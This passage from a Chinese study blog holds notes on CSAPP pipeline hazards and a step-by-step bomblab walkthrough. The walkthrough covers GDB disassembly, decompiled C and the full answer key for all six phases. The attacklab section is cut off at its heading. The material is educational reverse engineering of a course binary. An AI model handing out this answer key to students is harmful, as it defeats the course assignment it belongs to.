title="流水线冒险"></a>流水线冒险</h3><p>我们需要在流水线中引入反馈系统，因为当相邻指令有关联的时候，前一条指令并不能和后一条指令并行执行。这个关联有两种形式</p><ul><li>数据相关：后一条指令需要读取前一条指令执行的结果</li><li>控制相关：后一条指令为条件跳转，条件取决于当前语句的执行状态。</li></ul><p>这些相关有可能会导致指令执行得到错误的结果，称为冒险。</p><p>同相关一样，冒险也可以被分为两部分：数据冒险和控制冒险，我们先考虑数据冒险。</p><h4 id="用暂停来避免数据冒险"><a href="#用暂停来避免数据冒险" class="headerlink" title="用暂停来避免数据冒险"></a>用暂停来避免数据冒险</h4><p>暂停 (stalling) 是避免冒险的一种常用技术，暂停时，处理器会停止流水线中一条或多条指令，直到冒险条件不再满足。让一条指令停顿在译码阶段，直到产生它的源操作数的指令通过了写回阶段，这样我们的处理器就能避免数据冒险。</p><h4 id="用转发来避免数据冒险"><a href="#用转发来避免数据冒险" class="headerlink" title="用转发来避免数据冒险"></a>用转发来避免数据冒险</h4><p>PIPE- 的设计是在译码阶段从寄存器文件中读人源操作数，但是对这些源寄存器的写有可能要在写回阶段才能进行。与其暂停直到写完成，不如简单地将要写的值传到流水线寄存器 E 作为源操作数。</p><p>这种将结果值直接从一个流水线阶段传到较早阶段的技术称为数据转发(data forwarding，或简称转发，有时称为旁路 bypassing)。数据转发需要在基本的硬件结构中增加一些额外的数据连接和控制逻辑。</p><h4 id="加载-x2F-使用数据冒险"><a href="#加载-x2F-使用数据冒险" class="headerlink" title="加载&#x2F;使用数据冒险"></a>加载&#x2F;使用数据冒险</h4><p>有一类数据冒险不能单纯用转发来解决，因为内存读在流水线发生的比较晚。</p><p>我们可以使用暂停+转发两种思想结合的方式解决冒险，如果发现访存得到的结果需要在下一条指令马上被访问，那么我就暂停一个指令周期等到访存结束之后马上转发给下一条指令，此时下一条指令正在译码阶段。这种方法叫做加载互锁。</p><h4 id="避免控制冒险"><a href="#避免控制冒险" class="headerlink" title="避免控制冒险"></a>避免控制冒险</h4><p>当处理器无法根据处于取指阶段的当前指令来确定下一条指令的地址时，就会出现控制冒险。我们的流水线化处理器中，控制冒险只会发生在ret 指令和跳转指令。</p><p>在出现特殊情况时，暂停和往流水线中插人气泡的技术可以动态调整流水线的流程。</p><hr><p>原来已经 20 多天了都没看完这一章，看的头昏脑胀😶‍🌫️</p><p>先这样，真的看不动了，大概扫了一下接下来的几个小节内容和之前大差不差且看不懂</p><p>最近 <del>sxx</del> 布置的作业好多感觉阳气都被她吸干了，我是懒惰虫😿</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章 bomblab attacklab</title>
    <link href="/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/"/>
    <url>/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/</url>
    
    <content type="html"><![CDATA[<p>在”拆弹“过程中结合 GDB 调试，分析理解掌握各种指令和数据结构的汇编代码表示</p><span id="more"></span><h1 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h1><p>实验给到一个可执行程序和一个C语言的源码，但是源码的函数没有给全，只能判断大致逻辑。</p><p>设置了六个关卡需要全部通过之后才算成功，只要有一个关卡失败就会退出</p><hr><p>先看了一眼.c文件的源码，文件中有大致如下几个函数 ：<code>initialize_bomb()</code> 、<code>read_line()</code> 、<code>explode bomb()</code>、 <code>phase_[number]()</code> 、<code>phase_defuse</code>。</p><p>其中 explode 用来引爆炸弹结束进程，defuse 拆弹<del>（这两个还有那个初始化炸弹都不太重要）</del>，phase 系列函数就是具体每一个关卡对应的函数，每次新关卡都是 <code>read_line()</code> 先接受用户输入再进行判断的。</p><blockquote><p>之前机器里装了 pwndbg 用来调试，我觉得比光秃秃的 gdb 更好用🤪所以我这次还是用它啦</p></blockquote><p>直接 <code>gdb bomb</code> 调试看看，命令 <code>b main</code> 在 main 下断点然后 <code>n</code> 步入到第一个关卡函数。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_line.png"></p><p>程序在 <code>read line()</code> 这里停止，接收用户输入。由于关卡在输入之后，所以先输入一些乱码跳过这个函数进入下面的 <code>phase_1</code> 。</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>使用 <code>s</code> 命令进入到函数内部，发现 <code>call  strings_not_equal</code> 指令，根据字面意思也可以知道这是比较两个字符串。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-strings_not_equal.png"></p><p>此时 <em>rdi</em> 存储我们刚刚输入的内容，<em>rsi</em> 存储程序将要进行比较判断的内容，也是我们应该输入的正确答案：</p><p> <strong>Border relations with Canada have never been better.</strong>  </p><p>我们这条命令执行完毕后发现返回值是 0x1 也就是 1，后面有一个 <code>test eax,eax</code> 指令跟随零跳转，也就是说只有比较<strong>两个字符串相等</strong>才会继续执行程序，如果返回值为 1就会调用 <code>explode_bomb</code> 函数结束程序。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>进入下一个关卡，还是同样先输入再判断。先填充一些字符串进去再进入函数中调试观察。</p><p>进入 phase_2 后看到一个 read_six_number 函数，顾名思义就是读取六个数字。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_six_number.png"></p><p>这里发现读取的数字是从我们开始 <code>read_line()</code> 中输入的字符串截取的，  之后 <code>cmp  dword ptr [rsp], 1</code> 指令会将栈指针 rsp 的值和 1 比较。其中 dword ptr 代表要比较的数据在内存中占据4个字节，也就是我们<strong>输入的第一个数字要是 1</strong> 。</p><p>这样之后就会跳转到 <code>phase_2+52</code> 的地方去，我们发现它是一个循环</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-six_number_je.png"></p><p>其中循环中的判断内容是取当前 rbx-4 的值也就是判断的上一个数字的值赋值给 eax， 执行 <code>add eax, eax</code> 将值乘 2 再与当前要判断的数字比较。</p><p>总的来看是第一个数字是 1 ，之后的每一个数字都是前面的数字乘 2 。所以在这个关卡应该输入 <strong>1 2 4 8 16 32</strong> 。</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>进入到函数中发现有一个 <code>scanf()</code> 函数输出的格式化字符串是两个 <code>%d</code>，也就是我们在第三关要输入两个整数</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-scanf.png"></p><p>其中返回值 <code>eax</code> 表示正确格式化的数据个数，这里的判断要求返回值要大于 1 。</p><p>随后我们进入到 <code>phase_3+39</code> ，这里进的操作 <code>cmp   dword ptr [rsp+8], 7; ja    phase_3+106</code> ，目标操作数大于 7 才会进行跳转，跳转过去发现是 <code>explode_bomb()</code> 😅。</p><p>我们调试看这个 <code>[rsp+8]</code> 存储的信息就是我们输入的第一个参数，也就是说我们<strong>输入的第一个数要是整数且要小于等于 7</strong>。</p><p>下面就进入了一个跳转表</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct.png"></p><p>我们查看跳转表储存的信息</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_array.png"></p><p>这里也可以看出来输入的第一个值不能大于7 的原因，它还要用来匹配跳转表对应从0开始到7的索引值。</p><p>第一个 <code>0x400f7c</code> 就是 <code>phase_3+57</code> 的地址，我就直接用它，对应我们输入的第一个数字是 0。</p><p>这里的指令对应将 0xcf 也就是 207 赋值给 eax，随后将我们输入的第二个数字和 eax 比较，只有相等才能避开 <code>explode_bomb()</code></p><blockquote><p>看了看其他的选项都是给 eax 赋值再比较，原理是一样的</p></blockquote><p>所以说，综上我们知道第三次输入应该输入两个整数，我输入的是 <strong>0 207</strong></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>4和3是一样的套路，要求输入两个整数</p><p>不过这次的第一个数要求小于等于 0xe 也就是 14 才能跳转</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-jbe_0xe.png"></p><p>随后我们进入 func4 ，在此之前可以发现其中的四个参数分别由前面的指令赋值：edx &#x3D; 0xe&#x3D;14 、 esi &#x3D; 0 、 edi &#x3D; 我们输入的第一个数字</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-mov.png"></p><p>进入 func4  ,太长了直接 <code>disass func4 </code> 看这个函数完整的汇编代码</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-fun4.png"></p><p>很明显就发现发现它 call 了很多次 func4 也就是说这个是个递归函数，人工反编译一下大概就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(x,y,z)</span>      <span class="hljs-comment">//第一次递归中，x=我们输入的第一个数，y=0,z=14</span><br>&#123;    <br>    <span class="hljs-type">int</span> arg=z;<br>    arg-=y;<br>    <span class="hljs-type">int</span> val=arg;<br>    val&gt;&gt;=<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        z=val<span class="hljs-number">-1</span>;<br>        func4(x,y,z);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            y+=<span class="hljs-number">1</span>;<br>            func4(x,y,z);<br>            arg=arg+arg+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>整理简化一下，让它长得更像我们平时接触到的递归，大概就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> z)</span><br>&#123;<br>    <span class="hljs-type">int</span> arg=z-y;<br>    <span class="hljs-type">int</span> val=arg&gt;&gt;<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        arg=func4(x,y,val<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            arg=func4(x,y+<span class="hljs-number">1</span>,z);<br>            arg=arg*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据函数外 <code>phase_4+65</code> 处的判断，如果函数返回值为非 0 就会引爆炸弹，也就是说我们要让这个递归函数的最终返回值为0。写个测试代码运行一下发现 0、1、3 、7 都可以。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase4_return.png"></p><p>在返回值的检验后还有一个对 <code>rsp+0xc</code> 的检验，也就是我们输入的第二个值也要为0。</p><p>所以第四处应该输入两个数字，<strong>第一个是 0、1、3、7 任选其一，第二个是0</strong>。</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>还是输入 aaaaaaaaa 进入到第五个关卡，有一个 <code>string_lenth()</code> 函数</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-stringlenth.png"></p><p>函数下方紧跟的指令 <code>cmp eax, 6</code> 判断函数的返回值必须是 6，也就是说我们要输入六个字符</p><p>往下看成功跳转后的代码，里面还设置了一个 canary 保护，应该是检验上面的 6 长度字符的。代码依旧是很长我们直接看汇编代码</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase_5.png"></p><blockquote><p>箭头所指就是我们完成输入长度判断跳转后，关卡设置代码开始的地方</p></blockquote><p>先看 explode_bomb 前面用来判断的指令，有一个和 phase_1 一样的 <code>string_not_equal()</code> 函数，比较的文本是 flyers。也就是说我们输入的这个字符串最后的结果要是 “<strong>flyers</strong>“ ，但前面有那么多指令一定不是只输入一个 flyers 这么简单！</p><p>让我们来看一下：</p><p>在 +41 和 +74 之间有一个循环的部分，这个循环一定就是对字符串的处理了，同时，可以看出结束循环的标志是 <code>rax=6</code> 也就是说这个循环要进行六次。</p><p>我们去掉每次的循环次数判断来分析一下每一行指令都做了什么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movzx  ecx,BYTE PTR [rbx+rax*1]    ;rbx=输入的字符串 rax=0，每次循环都会加1<br>mov    BYTE PTR [rsp],cl    <br>mov    rdx,QWORD PTR [rsp]    ;到此句指令每次循环中读取用户输入字符串的一个字符到寄存器中<br>and    edx,0xf    ;取当前字符的二进制低四位数字<br>movzx  edx,BYTE PTR [rdx+0x4024b0]     ;从0x4024b0读取第rdx的字符，rdx=edx<br>mov    BYTE PTR [rsp+rax*1+0x10],dl    ;保存截取的字符<br></code></pre></td></tr></table></figure><p><code>0x4024b0</code> 处存储着一段字符串 “<strong>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</strong>“，四位的二进制最大是16，也就是说用来做判断的字符串有效值就是 maduiersnfotvbyl ，<del>后面是作者在内涵我们</del></p><p>至此我们得出了字符串处理的方法，每次循环从输入的字符串按顺序取一个字符，检查所取字符的低四位数字，以这个数字为偏移在给定字符串中查找，要求最后的结果是 flyers。</p><p>我写了一个函数来找可见字符串的组合：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    <span class="hljs-type">int</span> targetValue[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;; <br>    <span class="hljs-type">char</span> visibleChars[] = <span class="hljs-string">&quot; !#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">6</span>;j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n找到尾数为%d的字符：&quot;</span>,targetValue[j]);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; visibleChars[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++)<br>&#123;<br><span class="hljs-type">char</span> currentChar = visibleChars[i];<br>            <span class="hljs-type">int</span> charValue = currentChar - <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">// 将字符转换为对应的整数值</span><br>        <span class="hljs-keyword">if</span> ((charValue &amp; <span class="hljs-number">0xF</span>) == targetValue[j]) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, currentChar);<br>&#125;<br>        &#125;<br>    &#125;<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-5_result.png"></p><p>每一个拎出来一个组合一下就行，我选的 ionefg  <del>主要是全是小写字母不用大小写转换</del></p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><blockquote><p>本来说是这道题可以不做，但是我又不想这个国庆假期里去看新东西了（我是懒惰虫，就做了一下子，然后这一道题做了一天😿</p></blockquote><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_six_number.png"></p><p>已经摸清套路了，这个环节要求输入六个数字。</p><p>汇编代码很长，大致看了一下在整个函数里面跳来跳去的，看着就头昏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:push   r14<br>0x00000000004010f6 &lt;+2&gt;:push   r13<br>0x00000000004010f8 &lt;+4&gt;:push   r12<br>0x00000000004010fa &lt;+6&gt;:push   rbp<br>0x00000000004010fb &lt;+7&gt;:push   rbx<br>0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50<br>0x0000000000401100 &lt;+12&gt;:mov    r13,rsp<br>0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp<br>0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;    ;读六个数字<br>0x000000000040110b &lt;+23&gt;:mov    r14,rspn<br>0x000000000040110e &lt;+26&gt;:mov    r12d,0x0<br>0x0000000000401114 &lt;+32&gt;:mov    rbp,r13<br>0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]    ;取一个数字<br>0x000000000040111b &lt;+39&gt;:sub    eax,0x1    ;将取出的数字-1<br>0x000000000040111e &lt;+42&gt;:cmp    eax,0x5     ;结果要小于等于5<br>0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;   <br>0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401128 &lt;+52&gt;:add    r12d,0x1<br>0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6    ;六次循环<br>0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;    <br>0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d    <br>0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx<br>0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]<br>0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax      ;判断数字是否两两相等<br>0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;<br>0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401145 &lt;+81&gt;:add    ebx,0x1<br>0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5<br>0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:add    r13,0x4<br>0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;  <br>0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]    <br>0x0000000000401158 &lt;+100&gt;:mov    rax,r14<br>0x000000000040115b &lt;+103&gt;:mov    ecx,0x7<br>0x0000000000401160 &lt;+108&gt;:mov    edx,ecx    ;edx=7<br>0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]    ;当前数字-7，结果覆盖原数字<br>0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx<br>0x0000000000401166 &lt;+114&gt;:add    rax,0x4    ;准备读取下一个数字    <br>0x000000000040116a &lt;+118&gt;:cmp    rax,rsi    ;判断是不是最后一次循环<br>0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;    ;跳转回操作数字处理继续进行下一个数字的处理<br>0x000000000040116f &lt;+123&gt;:mov    esi,0x0<br>0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;<br>0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8] <br>0x000000000040117a &lt;+134&gt;:add    eax,0x1<br>0x000000000040117d &lt;+137&gt;:cmp    eax,ecx<br>0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0<br>0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx<br>0x000000000040118d &lt;+153&gt;:add    rsi,0x4    <br>0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18    <br>0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;<br>0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]   <br>0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1   <br>0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   <br>0x000000000040119f &lt;+171&gt;:mov    eax,0x1<br>0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0<br>0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;<br>0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]<br>0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]<br>0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]<br>0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx<br>0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]<br>0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx<br>0x00000000004011c4 &lt;+208&gt;:add    rax,0x8<br>0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi<br>0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx<br>0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;<br>0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0<br>0x00000000004011da &lt;+230&gt;:mov    ebp,0x5<br>0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]<br>0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]<br>0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax<br>0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]<br>0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1<br>0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50    ;准备结束函数<br>0x00000000004011fb &lt;+263&gt;:pop    rbx<br>0x00000000004011fc &lt;+264&gt;:pop    rbp<br>0x00000000004011fd &lt;+265&gt;:pop    r12<br>0x00000000004011ff &lt;+267&gt;:pop    r13<br>0x0000000000401201 &lt;+269&gt;:pop    r14<br>0x0000000000401203 &lt;+271&gt;:ret    <br></code></pre></td></tr></table></figure><p> <del>乱七八糟乱七八糟</del>    </p><p>这个循环大概分为几个部分：</p><ul><li><p><em>+23 - +60</em> 判断输入的六个数字是否都小于等于6</p></li><li><p><em>+62 - +93</em> 两个小循环来判断输入的数字是不是重复的   </p></li><li><p><em>+108 -+128</em> 所有数字都与7做差再用结果覆盖原始值</p></li><li><p><em>+130 - +181</em> 重新安排链表</p></li><li><p><em>+183 - +257</em> 检验链表中的数据是否从大到小排序</p></li></ul><p>关于链表的操作部分：</p><p>+130 处的操作是 <code>mov rdx,QWORD PTR [rdx+0x8]</code> ，这是链表的一种表示方法，将链表中的节点串接起来。</p><p>在 +176 处取了一个地址进行操作，查看此处内存数据：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_information.png"></p><p>根据信息存储的方式也可以判断出这是一个链表，从 1-6 每一个索引值对应节点存储的数据为：332，168，924，691，477，413</p><p>也就是说这部分中，程序会先用7减去我们输入的数据，然后以我们输入的数据的顺序来重新排列链表中数据的顺序。比如我们输入 1、2、3、4、5、6 ，与 7 做差结果是 6、5、4、3、2、1，假设我们用 [n] 来表示原本链表中的第n个数据，那么它的排序顺序就是 [6]、[5]、[4]、[3]、[2]、[1]，并且此时我们需要保证数据是从大到小排序的。</p><p>所以可以逆向分析，我们先把原链表中的数据排序，顺序是 3、4、5、6、1、2。又因为我们需要先与 7 做差，再逆向推回去就是 <strong>4、3、2、1、6、5</strong>。</p><hr><p>我最后总的作答是这样的</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">Border relations with Canada have never been better.<br>1 2 4 8 16 32<br>0 207<br>0 0<br>ionefg<br>4 3 2 1 6 5<br></code></pre></td></tr></table></figure><p>完结撒花~🥳</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-result.png"></p><h1 id="attaklab"><a href="#attaklab" class="headerlink" 